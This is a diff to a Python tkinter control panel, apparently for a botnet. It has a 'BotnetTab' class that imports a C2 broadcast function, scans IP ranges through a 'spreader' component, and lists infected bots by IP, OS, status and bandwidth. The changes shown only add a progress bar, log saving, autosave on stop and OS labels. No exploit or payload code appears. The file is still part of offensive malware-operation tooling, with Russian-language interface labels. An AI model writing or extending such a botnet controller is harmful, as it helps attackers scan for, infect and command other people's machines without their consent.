@@ -1,6 +1,6 @@
 import tkinter as tk
-from tkinter import ttk, messagebox, simpledialog, scrolledtext
-import json, os, threading, queue, ipaddress
+from tkinter import ttk, messagebox, simpledialog, scrolledtext, filedialog
+import json, os, threading, queue, ipaddress, time
 from botnet.c2 import broadcast_command
 from utils.logger import log
 from utils.widgets import ToolTip
@@ -65,6 +65,12 @@ class BotnetTab(tk.Frame):
         ttk.Button(btn_frame, text="Сканировать диапазон", command=self.scan_range).pack(side=tk.LEFT, padx=2)
         ttk.Button(btn_frame, text="Остановить", command=self.stop_scan).pack(side=tk.LEFT, padx=2)
         ttk.Button(btn_frame, text="Копировать лог", command=self.copy_log).pack(side=tk.LEFT, padx=2)
+        ttk.Button(btn_frame, text="Сохранить лог", command=self.save_log).pack(side=tk.LEFT, padx=2)
+        
+        # Прогресс-бар
+        self.progress_var = tk.IntVar()
+        self.progress_bar = ttk.Progressbar(scan_frame, variable=self.progress_var, maximum=100)
+        self.progress_bar.pack(fill=tk.X, padx=5, pady=2)
         
         self.scan_log = scrolledtext.ScrolledText(scan_frame, height=12, state=tk.NORMAL)
         self.scan_log.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
@@ -96,11 +102,25 @@ class BotnetTab(tk.Frame):
         self.clipboard_append(self.scan_log.get(1.0, tk.END))
         messagebox.showinfo("Скопировано", "Лог скопирован в буфер обмена")
 
+    def save_log(self):
+        filename = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text files", "*.txt")])
+        if filename:
+            with open(filename, 'w') as f:
+                f.write(self.scan_log.get(1.0, tk.END))
+            messagebox.showinfo("Сохранено", f"Лог сохранён в {filename}")
+
     def process_messages(self):
         try:
             while True:
                 msg = self.spreader.message_queue.get_nowait()
                 self.log_to_scan(msg)
+                # Обновление прогресс-бара
+                if "[Progress]" in msg:
+                    try:
+                        pct = int(msg.split("(")[1].split("%")[0])
+                        self.progress_var.set(pct)
+                    except:
+                        pass
         except queue.Empty:
             pass
         self.after(100, self.process_messages)
@@ -110,6 +130,7 @@ class BotnetTab(tk.Frame):
         self.spreader.load_settings("avz_settings.json")
         self.spreader.worker_threads = int(self.scan_threads.get())
         self.spreader.interval = 0
+        self.progress_var.set(0)
         threading.Thread(target=self._run_scan_once_global, daemon=True).start()
 
     def _run_scan_once_global(self):
@@ -127,11 +148,18 @@ class BotnetTab(tk.Frame):
                 return
         else:
             targets = [target]
+        self.progress_var.set(0)
         self.spreader.scan_once(targets)
 
     def stop_scan(self):
         self.spreader.stop()
         self.log_to_scan("[Сканирование] Остановлено")
+        # Автосохранение лога при остановке
+        timestamp = time.strftime("%Y%m%d_%H%M%S")
+        auto_filename = f"scan_log_{timestamp}.txt"
+        with open(auto_filename, 'w') as f:
+            f.write(self.scan_log.get(1.0, tk.END))
+        self.log_to_scan(f"[Auto] Лог сохранён: {auto_filename}")
 
     def toggle_spreader(self):
         if self.spreader.running:
@@ -189,11 +217,21 @@ class BotnetTab(tk.Frame):
         data = filtered if filtered is not None else self.bot_data
         for bot in data:
             status = bot.get("status","offline")
+            os_type = bot.get("os","linux")
+            # Иконка ОС (текстовая)
+            if os_type == "linux":
+                os_icon = "🐧 Linux"
+            elif os_type == "windows":
+                os_icon = "🪟 Windows"
+            elif os_type == "iot":
+                os_icon = "📡 IoT"
+            else:
+                os_icon = os_type
             tag = "online" if status == "online" else "offline"
             self.tree.insert("", tk.END, values=(
                 bot.get("id",""),
                 bot.get("ip",""),
-                bot.get("os",""),
+                os_icon,
                 status,
                 f"{bot.get('bandwidth',0)} Mbps"
             ), tags=(tag,))
